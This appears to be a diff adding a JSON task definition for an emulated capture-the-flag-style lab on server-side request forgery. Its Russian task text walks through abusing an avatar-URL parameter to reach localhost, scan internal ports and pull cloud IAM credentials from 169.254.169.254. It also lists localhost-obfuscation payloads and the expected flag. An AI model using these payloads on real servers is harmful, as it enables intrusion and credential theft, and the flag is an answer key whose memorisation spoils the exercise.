@@ -1,0 +1,27 @@
+{
+  "id": "web-ssrf-core",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ssrf_m3t4d4t4_1am_cr3ds}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: базовый SSRF — от localhost до облачных метаданных\n\n`https://shop.local/profile/avatar` тянет аватар по URL из параметра\n`avatar_url`. Сервер ходит по нашему адресу — проверим, докуда он дотянется.\n\n1. Легитимный запрос:\n\n   curl -s -d 'avatar_url=https://example.com/a.png' https://shop.local/profile/avatar\n\n2. Ходит ли он на localhost?\n\n   curl -s -d 'avatar_url=http://127.0.0.1:80/' https://shop.local/profile/avatar\n\n3. Сканируем внутренние порты (разное время ответа = что-то слушает):\n\n   curl -s -d 'avatar_url=http://127.0.0.1:8080/' https://shop.local/profile/avatar\n\n4. Облачные метаданные — узнаём имя роли:\n\n   curl -s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' https://shop.local/profile/avatar\n\n5. Забираем временные креды роли (в ответе — флаг):\n\n   curl -s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role' https://shop.local/profile/avatar > found.txt\n\n6. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/profile/avatar)",
+      "cases": [
+        { "match": "security-credentials/my-role|my-role", "example": "-s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"{\\\"AccessKeyId\\\":\\\"ASIA2EXAMPLEKEY\\\",\\\"SecretAccessKey\\\":\\\"wJalrXUtnFEMI/K7MDENG\\\",\\\"Token\\\":\\\"IQoJb3JpZ2luX2VjEB...\\\",\\\"Flag\\\":\\\"nto{ssrf_m3t4d4t4_1am_cr3ds}\\\"}\"}\n" },
+        { "match": "security-credentials/", "example": "-s -d 'avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"my-role\"}\n" },
+        { "match": "169\\.254\\.169\\.254/latest/meta-data/", "example": "-s -d 'avatar_url=http://169.254.169.254/latest/meta-data/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"ami-id\\ninstance-id\\niam/\\nhostname\"}\n" },
+        { "match": "169\\.254\\.169\\.254", "example": "-s -d 'avatar_url=http://169.254.169.254/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"latest/\"}\n" },
+        { "match": "127\\.0\\.0\\.1:8080|127\\.0\\.0\\.1%3A8080", "example": "-s -d 'avatar_url=http://127.0.0.1:8080/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"admin.html\"}\n" },
+        { "match": "127\\.0\\.0\\.1:6379", "example": "-s -d 'avatar_url=http://127.0.0.1:6379/' https://shop.local/profile/avatar", "output": "{\"error\":\"invalid image header\"}\n" },
+        { "match": "0x7f000001|2130706433|\\[::1\\]|127\\.1", "example": "-s -d 'avatar_url=http://0x7f000001/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"index.html\"}\n" },
+        { "match": "127\\.0\\.0\\.1", "example": "-s -d 'avatar_url=http://127.0.0.1:80/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"index.html\"}\n" },
+        { "match": "example\\.com", "example": "-s -d 'avatar_url=https://example.com/a.png' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"a.png\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только загрузчик аватара shop.local/profile/avatar.\n"
+    }
+  }
+}
